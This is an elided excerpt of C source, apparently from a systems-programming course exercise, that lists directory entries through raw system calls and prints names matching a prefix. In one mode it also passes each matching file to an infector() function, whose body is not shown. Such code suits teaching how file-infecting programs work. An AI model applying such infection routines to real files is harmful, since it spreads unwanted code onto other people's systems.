...
int main (int argc , char* argv[], char* envp[]) {
	...
	int i, fd, count, prefIndex, attIndex;
	ent *entp;
	char buf[BUF_SIZE];
	char type;
	...
	while(i<count){
		...
		else if(prefixMode && strncmp(entp->name, argv[prefIndex]+2, strlen(argv[prefIndex]+2))==0){
			printDirentType(type);
			reportSysCall(system_call(SYS_WRITE, STDOUT, entp->name, strlen(entp->name)), SYS_WRITE);
			reportSysCall(system_call(SYS_WRITE, STDOUT, "\n", CHARSIZE), SYS_WRITE);
		}
		else if(attachedMode && strncmp(entp->name, argv[attIndex]+2, strlen(argv[attIndex]+2))==0){
			printDirentType(type);
			reportSysCall(system_call(SYS_WRITE, STDOUT, entp->name, strlen(entp->name)), SYS_WRITE);
			reportSysCall(system_call(SYS_WRITE, STDOUT, "\n", CHARSIZE), SYS_WRITE);
			infector(entp->name);
